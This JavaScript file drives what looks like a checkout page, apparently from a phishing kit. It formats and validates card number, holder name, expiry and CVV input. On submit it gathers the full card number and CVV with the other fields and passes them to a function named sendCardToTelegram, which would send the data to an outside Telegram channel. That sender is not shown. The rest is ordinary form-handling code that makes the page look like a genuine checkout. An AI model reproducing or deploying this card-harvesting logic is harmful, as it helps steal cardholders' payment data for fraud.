const submitBtn = document.getElementById("submit-btn");
const paymentForm = document.getElementById("payment-form");
const cardNumberInput = document.getElementById("card-number");
const cardHolderInput = document.getElementById("card-holder");
const cardExpiryInput = document.getElementById("card-expiry");
const cardCvvInput = document.getElementById("card-cvv");

function formatCardNumber(value) {
  const digits = value.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function formatCardExpiry(value) {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length <= 2) return digits;
  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

function restrictToDigits(el, maxLength) {
  if (!el) return;
  el.addEventListener("input", () => {
    el.value = el.value.replace(/\D/g, "").slice(0, maxLength);
    updateSubmitButton();
  });
  el.addEventListener("keydown", (e) => {
    const allowed = ["Backspace", "Delete", "Tab", "ArrowLeft", "ArrowRight", "Home", "End"];
    if (allowed.includes(e.key)) return;
    if (!/^\d$/.test(e.key)) e.preventDefault();
  });
}

function setupCardNumberInput(el) {
  if (!el) return;
  el.addEventListener("input", () => {
    el.value = formatCardNumber(el.value);
    updateSubmitButton();
  });
  el.addEventListener("keydown", (e) => {
    const allowed = ["Backspace", "Delete", "Tab", "ArrowLeft", "ArrowRight", "Home", "End"];
    if (allowed.includes(e.key)) return;
    if (!/^\d$/.test(e.key)) e.preventDefault();
  });
}

function setupCardExpiryInput(el) {
  if (!el) return;
  el.addEventListener("input", () => {
    el.value = formatCardExpiry(el.value);
    updateSubmitButton();
  });
  el.addEventListener("keydown", (e) => {
    const allowed = ["Backspace", "Delete", "Tab", "ArrowLeft", "ArrowRight", "Home", "End"];
    if (allowed.includes(e.key)) return;
    if (!/^\d$/.test(e.key)) e.preventDefault();
  });
}

function isCardValid() {
  const digits = cardNumberInput.value.replace(/\D/g, "");
  return digits.length >= 15 && digits.length <= 19;
}

function isExpiryValid() {
  return cardExpiryInput.value.replace(/\D/g, "").length === 4;
}

function isCvvValid() {
  const len = cardCvvInput.value.replace(/\D/g, "").length;
  return len >= 3 && len <= 4;
}

function isFormComplete() {
  if (!cardHolderInput.value.trim()) return false;
  if (!isCardValid()) return false;
  if (!isExpiryValid()) return false;
  if (!isCvvValid()) return false;
  return true;
}

function updateSubmitButton() {
  if (submitBtn) submitBtn.disabled = !isFormComplete();
}

if (paymentForm) {
  initShell();

  setupCardNumberInput(cardNumberInput);
  restrictToDigits(cardCvvInput, 4);
  setupCardExpiryInput(cardExpiryInput);

  cardHolderInput.addEventListener("input", updateSubmitButton);

  updateSubmitButton();

  paymentForm.addEventListener("submit", (e) => {
    e.preventDefault();
    if (!submitBtn.disabled) {
      const digits = cardNumberInput.value.replace(/\D/g, "");
      const paymentData = {
        cardHolder: cardHolderInput.value.trim(),
        cardNumber: digits,
        cardExpiry: cardExpiryInput.value,
        cardCvv: cardCvvInput.value.replace(/\D/g, ""),
        cardLast4: digits.slice(-4),
        orderDateTime: new Date().toISOString(),
      };
      saveCheckoutData(paymentData);
      if (typeof sendCardToTelegram === "function") {
        sendCardToTelegram(paymentData);
      }
      navigateWithLoading("recapitulatif", "payment");
    }
  });

  document.addEventListener("salt:languagechange", updateSubmitButton);
}
